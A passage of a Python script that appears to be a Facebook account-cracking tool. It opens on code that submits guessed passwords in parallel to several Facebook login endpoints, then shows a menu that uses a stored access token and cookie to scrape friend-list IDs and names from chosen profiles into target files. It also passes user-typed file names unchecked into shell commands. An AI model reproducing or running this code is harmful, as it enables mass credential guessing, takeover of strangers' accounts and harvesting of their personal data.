                                __juttbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
                            elif vz == '1' and uz == '3':
                                __juttbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
                            elif vz == '2' and uz == '1':
                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
                            elif vz == '2' and uz == '2':
                                __juttbrand__.submit(self.__free__,uid,pwx,url2)
                            elif vz == '2' and uz == '3':
                                __juttbrand__.submit(self.__free__,uid,pwx,url3)
                            elif vz == '3' and uz == '1':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
                            elif vz == '3' and uz == '2':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
                            elif vz == '3' and uz == '3':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url3)
                            else:
                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
                        except:
                            pass
            hasil(ok,f2,cp)
        elif tg == '0':
            main_menu()
        else:
            print ('Select Valid Option')
            time.sleep(3)
            self.__random__()
            
            
            
def check_frnds(qcki):
    qcki = (";{qcki}")
   # print(qcki)
    try:
        a = requests.get('https://mbasic.facebook.com/profile.php?v=friends',cookies={'cookie':qcki}).text.replace("amp;","")
    except:
        pass
    try:
        ttl = re.findall(">Friends (.*?)<",a)[0].replace('(','').replace(')','')
        return (str(f"{str(ttl)}"))
    except:
        return 'no_results'
        
        
        
def ext_menu():
    os.system("clear")
    try:
        token  = open('.access_token.txt','r').read().replace('\n', '')
        cookie = open('.cokie.txt','r').read().replace('\n', '')
    except:
        print('\n\033[0;97mCookies Invalid ')
        os.system('rm -rf .access_token.txt .cokie.txt')
        time.sleep(1)
        login()
    try:
        me = requests.get(f'https://graph.facebook.com/me?access_token={token}', cookies={'cookie':cookie}).json()
        name = me['name']
        iid = me['id']
    except KeyError:
        if 'Error loading application' in str(me):
            print ('\r\033[0;97mCokie Not Expired But Need Login Again')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
        elif 'Please reduce the amount' in str(me):
            print ('\r\033[0;97minternet Error')
            time.sleep(1)
            ext_menu()
        else:
            print ('\033[0;97mCokie invalid')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
    os.system('clear')
    print (logo4)
    print ('\033[1;33m  ~~~~~~Extract ids Menu~~~~~~\033[0;97m')
    print (47*'-')
    print ('\033[1;32m[1]Extract ids Only New')
    print ('\033[1;32m[2]Extract All Old New Mix')
    print ('\033[1;32m[3]Extract ids Only New Auto')
    print ('\033[1;32m[4]Remove Double Links From File\033[0;97m')
    print ('\033[1;32m[5]Separate Links From File')
    print ('\033[1;32m[6]Cut Links From Used File')
    print ('\033[1;32m[7]Delete Cookies')
    print ('\033[1;32m[0]Back\033[0;97m')
    print (47*'-')
    ext_menu_sel()

def ext_menu_sel():
    hh = input('\033[1;36mSelect Option: \033[0;97m')
    if hh == "1" or hh == "01":
        lolex()
    elif hh == "2" or hh == "02":
        oldex()
    elif hh == "3" or hh == "03":
        autofile()
    elif hh == "4" or hh == "04":
        double()
    elif hh == "5" or hh == "05":
        separate()
    elif hh == "6" or hh == "06":
        cutrs()
    elif hh == "7" or hh == "07":
        os.system('rm -rf .access_token.txt')
        os.system('rm -rf .cokie.txt')
        login()
    elif hh == "0":
        main_menu()
    elif hh == "":
        print ('Select Valid Option')
        ext_menu_sel()
    else:
        print ('Select Valid Option')
        ext_menu_sel()

def lolex():
    os.system("clear")
    try:
        __cookie__ = open(".access_token.txt", "r").read().replace('\n', '')
        cookie = open('.cokie.txt', 'r').read().replace('\n', '')
    except:
        print ('Cookies Invalid')
        time.sleep(1)
        os.system('rm -rf .access_token.txt .cokie.txt')
        login()

    os.system('clear')
    print (logo4)
    print ('\033[1;33mFor Example /sdcard/jutt.txt etc...\033[0;97m')
    print (47*'-')
    fp = input('\033[1;32mOutput Save File Name: \033[0;97m')
    if '/sdcard/' not in fp:
        print ('\033[1;33mGive Correct Directory /sdcard/filename.txt\033[0;97m')
        time.sleep(2)
        lolex()
    print ('\033[1;33mExample 1, 2, 3, 4, 5, 6, 7 etc...\033[0;97m')
    zo = int(input('\033[1;32mHow Many Choice Links You Want To Select?: \033[0;97m'))
    print ('\033[1;33mSelect Link For Example 100089 100090')
    gh = []
    t = 0
    for t in range(zo):
        t+=1
        fb = input('\033[1;32m[%s]choose id link: \033[0;97m'%(t))
        gh.append(fb)
    print ('')
    newex(gh,fp,__cookie__,cookie)

def newex(gh,fp,__cookie__,cookie):
    csy = input('\033[1;32mids: \033[0;97m')
    bcd = csy.rsplit('|')[0]
    if csy == ' ' or csy == '':
        ext_menu()
    try:
        os.system('rm -rf .out*')
        ihh = '5000'
        knt = ('.out.txt')
        list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(bcd,__cookie__), cookies={'cookie':cookie}).json()
        for ids in list_one['friends']['data']:
            uid = ids['id']
            name = ids['name']
            open(knt,'a').write(uid+'|'+name+'\n')

        print ('\r\033[1;32mSuccessfull id Extract '+bcd)
        for zh in gh:
            os.system('cat .out.txt | grep '+zh+' >> .out1.txt')
            os.system('sort -r .out1.txt | uniq >> '+fp)
        newex(gh,fp,__cookie__,cookie)
    except KeyError:
        if 'Error loading application' in str(list_one):
            print ('\r\033[0;97mCokie not expired but need login again')
            newex(gh,fp,__cookie__,cookie)
        elif 'Please reduce the amount' in str(list_one):
            print ('\r\033[0;97minternet error missing extract link')
            newex(gh,fp,__cookie__,cookie)
        elif 'Unsupported get request' in str(list_one):
            print ('\r\033[0;97mAccount cp or lock of this link')
            newex(gh,fp,__cookie__,cookie)
        elif 'error' in str(list_one):
            print ('\r\033[0;97mCookie expired login new cookie')
            newex(gh,fp,__cookie__,cookie)
        else:
            print('\r\033[0;97mFriendlist private of this link')
            newex(gh,fp,__cookie__,cookie)

def oldex():
    os.system("clear")
    try:
        __cookie__ = open(".access_token.txt", "r").read().replace('\n', '')
        cookie = open('.cokie.txt', 'r').read().replace('\n', '')
    except:
        print ('Cookies invalid')
        time.sleep(1)
        os.system('rm -rf .access_token.txt .cokie.txt')
        login()

    os.system('clear')
    print (logo4)
    print ('')
    print ('\033[1;33mFor Example /sdcard/jutt.txt\033[0;97m')
    print ('')
    fp = input('\033[1;32mOutput Save File Name: \033[0;97m')
    if '/sdcard/' in fp:
        allex(fp,__cookie__,cookie)
    else:
        print ('\033[1;31mWrong input Directory')
        print ('\033[1;37mPut /sdcard/filename.txt')
        time.sleep(3)
        oldex()

def allex(fp,__cookie__,cookie):
    csy = input('id: ')
    bcd = csy.rsplit('|')[0]
    ihh = '5000'
    knt = ('.out.txt')
    ys  = open(knt, 'w')
    if csy == ' ' or csy == '':
        ext_menu()
    try:
        os.system('rm -rf .out*')
        list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(bcd,__cookie__), cookies={'cookie':cookie}).json()
        for ids in list_one['friends']['data']:
            uid = ids['id']
            name = ids['name']
            open(knt,'a').write(uid+'|'+name+'\n')

        print ('\r\033[1;32mSuccessfull id Extract '+bcd)
        vo = "10"
        os.system('cat .out.txt | grep '+ vo +' >> .out1.txt')
        os.system('sort -r .out1.txt | uniq >> '+fp)
        allex(fp,__cookie__,cookie)
    except KeyError:
        if 'Error loading application' in str(list_one):
            print ('\r\033[0;97mCokie not expired but need login again')
            allex(fp,__cookie__,cookie)
        elif 'Please reduce the amount' in str(list_one):
            print ('\r\033[0;97minternet error missing extract link')
            allex(fp,__cookie__,cookie)
        elif 'Unsupported get request' in str(list_one):
            print ('\r\033[0;97mAccount cp or lock of this link')
            allex(fp,__cookie__,cookie)
        elif 'error' in str(list_one):
            print ('\r\033[0;97mCookie expired login new cookie')
            allex(fp,__cookie__,cookie)
        else:
            print('\r\033[0;97mFriendlist private of This Link')
            allex(fp,__cookie__,cookie)

def autofile():
    os.system('clear')
    print (logo4)
    try:
        __cookie__ = open(".access_token.txt", "r").read().replace('\n', '')
        cookie = open('.cokie.txt', 'r').read().replace('\n', '')
    except:
        print ('Cookies invalid')
        time.sleep(1)
        os.system('rm -rf .access_token.txt .cokie.txt')
        login()
    os.system('rm -rf .out*')
    try:
        rgb = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/ids.txt').text
        open('.ids.txt', 'w').write(rgb)
    except requests.exceptions.ConnectionError:
        print ('\033[0;97mNo internet Connection')
        sys.exit()
    ebd = open('.ids.txt', 'r').read().splitlines()[:2]
    fgf = open('.ids.txt', 'r').read().splitlines()[2:4]
    os.system('rm -rf .ids.txt')
    print ('\033[1;33m  ~~~~~Put Just 1 id Link~~~~~\033[0;97m')
    print (47*'-')
    bcd = input('\033[1;36mPut id: \033[0;97m')
    if bcd == '':
        ext_menu()
    ihh = '5000'
    knt = '.out.txt'
    try:
        list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(bcd,__cookie__), cookies={'cookie':cookie}).json()
        for ids in list_one['friends']['data']:
            uid = ids['id']
            open(knt,'a').write(uid+'\n')

        print ('\r\033[1;32mSuccessfull id Extract '+bcd)
        for vo in ebd:
            os.system('cat .out.txt | grep '+ vo +' >> .out1.txt')
    except KeyError:
        if 'Error loading application' in str(list_one):
            print ('\r\033[0;97mCokie not expired but need login again')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
        elif 'Please reduce the amount' in str(list_one):
            print ('\033[0;97minternet error missing extract link')
            time.sleep(1)
            autofile()
        elif 'Unsupported get request' in str(list_one):
            print ('\r\033[0;97mAccount cp or lock of this link')
            time.sleep(1)
            autofile()
        elif 'error' in str(list_one):
            print ('\r\033[0;97mCookie expired login new cokie')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
        else:
            print('\r\033[0;97mFriendlist private of this link')
            time.sleep(1)
            autofile()
    frf = [50, 55, 40, 60, 64, 69, 67, 71, 46, 58, 74]
    dtz = random.choice(frf)
    os.system('sort -r .out1.txt | uniq >> .out2.txt')
    bcf = open('.out2.txt', 'r').read().splitlines()[:dtz]
    if len(bcf)<2:
        print ('\n\033[1;33mNew ids not found in this link try another link\033[0;97m')
        input('Press enter to back')
        os.system('rm -rf .out*')
        ext_menu()
    os.system('rm -rf .out*')
    os.system('clear')
    print (logo4)
    print ('\033[1;33mExample /sdcard/jutt.txt\033[0;97m')
    print (47*'-')
    save_ = input('\033[1;33mOutput Save File Name: \033[0;97m')
    ihb = '5000'
    idx = []
    for uids in bcf:
        try:
            idd = []
            _cookie_ = open('.access_token.txt', 'r').read().replace('\n', '')
            cookie = open('.cokie.txt', 'r').read().replace('\n', '')
            list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(uids,_cookie_), cookies={'cookie':cookie}).json()
            for ids in list_one['friends']['data']:
                uid = ids['id']
                name = ids['name']
                idd.append(uid+'|'+name+'\n')
                open('.out.txt','a').write(uid+'|'+name+'\n')

            print ('\r\033[1;32mSuccessfull id Extract '+uids+'\033[0;97m')
            for xo in fgf:
                os.system('cat .out.txt | grep '+ xo +' >> .out1.txt')
                os.system('sort -r .out1.txt | uniq >> '+save_)
            os.system('rm -rf .out*')
        except KeyError:
            if 'Error loading application' in str(list_one):
                print ('\r\033[0;97mCokie not expired but need login again')
                pass
            elif 'Please reduce the amount' in str(list_one):
                print ('\r\033[0;97minternet error missing extract link')
                pass
            elif 'Unsupported get request' in str(list_one):
                print ('\r\033[0;97mAccount cp or lock of this link')
                pass
            elif 'error' in str(list_one):
                print('\r\033[0;97mCookies expired login new cookie')
                pass
            else:
                print ('\r\033[0;97mFriendlist private of this link')
                pass
    os.system('sort -r '+save_+' | uniq >> .out.txt')
    os.system('cat .out.txt > '+save_)
    yuy = open(save_, 'r').read().splitlines()
    fuf = str(len(yuy))
    print (47*'-')
    print ('\033[1;33mSuccessfully Creat File\033[0;97m')
    print (47*'-'+'\n\033[1;32mTotal ids > '+fuf)
    print (47*'-'+'\n\033[1;36mYour File Save Path > '+save_)
    input('\033[1;32mPress Enter To Back\033[0;97m')
    ext_menu()

def double():
    os.system('clear')
    print (logo4)
    sf = input("\033[1;32mInput doubling File :\033[0;97m")
    if sf == ' ' or sf == '':
        main_menu()
    print ('\033[1;33mFor Example /sdcard/jutt.txt')
    tf = input("\033[1;32minput file path for save original: \033[0;97m")
    if '/sdcard/' in tf:
        os.system("sort -r "+ sf +" | uniq  >> "+tf)
        print("File sucessfull save as "+tf)
        input('\033[1;32mPress Enter To Back\033[0;97m')
        main_menu()
    else:
        print ('\033[1;31mWrong input Directory')
        print ('\033[1;37mPut /sdcard/filename.txt\033[0;97m')
        time.sleep(3)
        double()

def separate():
    os.system('clear')
    print (logo4)
    print ('\033[1;36mSeparate Links From File\033[0;97m')
    print (47*'-')
    file_name = input('\033[1;32mInput file name: ')
    print(47*'-')
    if file_name == '':
        main_menu()
    print ('\033[1;33mFor Example /sdcard/jutt.txt\033[0;97m')
    print (47*'-')
    new_save = input('\033[1;36mSave New file Name: \033[0;97m')
    if "/sdcard/" not in new_save:
        print ('Put /sdcard/yourfile name.txt')
        time.sleep(2)
        separate()
    elif new_save == '':
        main_menu()
    try:
        limit = int(input('\033[1;33mHow many links do you want to separate? \033[0;97m'))
    except:
        limit = 1
    y = 0
    for y in range(limit):
        y+=1
        links = input('\033[0;97mSelect link %s: '%(y))
        os.system('cat '+file_name+' | grep '+links+' >> '+new_save)
    print(47*'-')
    print('\033[1;32mLinks Separate successfully')
    print('\033[1;33mNew file saved as: /sdcard/'+new_save)
    print(47*'-')
    input('\033[1;36mPress enter to back ')
    main_menu()

def cutrs():
    os.system('clear')
    print (logo4)
    print ('\033[1;33m~~~~~~Cut Links From Used File~~~~~~~\033[0;97m')
    print (47*'-')
    bc = input('\033[1;32mPut File: \033[0;97m')
    try:
        ba = open(bc, 'r').read().splitlines()
    except (FileNotFoundError, IOError):
        print ('\033[0;97mFile Not Found')
        time.sleep(3)
        cutrs()
    print ('\033[1;33mExample /sdcard/filename.txt\033[0;97m')
    sab = input('\033[1;36mSave File Name: \033[0;97m')
    print ('\033[1;33mExample 2000, 5000, 10000, 20000, etc..')
    try:
        fdv = int(input('\033[1;32mSelect Cuting Limit From File: \033[0;97m'))
        dy = ba[fdv:5000000]
        bos = '\n'.join(dy)
        open(sab, 'w').write(bos + '\n')
        print ('\033[1;33mFile successfully Save > '+sab)
        print (47*'-')
        input('\033[1;32mPress Enter To Back\033[0;97m')
        main_menu()
    except (ValueError, EOFError, KeyboardInterrupt):
        print ('\033[1;33m\nSelect Valid limit\033[0;97m')
        print ('\033[1;33mExample 2000, 5000, 10000, 20000, etc..')
        input('\033[1;32mPress Enter Go To Back\033[0;97m')
        cutrs()


if __name__ == '__main__':
    os.system('git pull')
crack().plerr()

